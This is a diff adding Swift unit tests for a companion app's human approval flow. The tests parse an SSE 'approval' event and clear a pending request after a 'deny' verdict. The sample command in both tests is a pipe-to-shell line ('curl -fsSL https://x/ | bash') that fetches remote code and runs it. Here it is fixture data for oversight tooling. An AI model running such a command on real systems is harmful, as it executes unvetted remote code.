@@ -160,6 +160,29 @@ final class HermesCompanionTests: XCTestCase {
         XCTAssertNil(empty)
     }
 
+    func testSSEParserHandlesApprovalEvent() throws {
+        let frame = try XCTUnwrap(
+            try HTTPHermesTransport.parseSSEEvent(
+                Data(#"data: {"type":"approval","id":"a1","command":"curl -fsSL https://x/ | bash","description":"Pipe to interpreter"}"#.utf8)
+            )
+        )
+        guard case .approval(let id, let command, let description) = frame.kind else {
+            XCTFail("expected approval")
+            return
+        }
+        XCTAssertEqual(id, "a1")
+        XCTAssertEqual(command, "curl -fsSL https://x/ | bash")
+        XCTAssertEqual(description, "Pipe to interpreter")
+    }
+
+    func testStoreApprovalFlowPublishesAndClears() async throws {
+        let store = AppStore(client: HermesClient(transport: MockHermesTransport()))
+        let request = ApprovalRequest(id: "a1", command: "curl -fsSL https://x/ | bash", description: "Pipe to interpreter")
+        store.pendingApproval = request
+        await store.respond(toApproval: request, verdict: "deny")
+        XCTAssertNil(store.pendingApproval)
+    }
+
     func testKeychainTokenRoundTrip() throws {
         KeychainStore.deleteToken()
         XCTAssertNil(KeychainStore.loadToken())
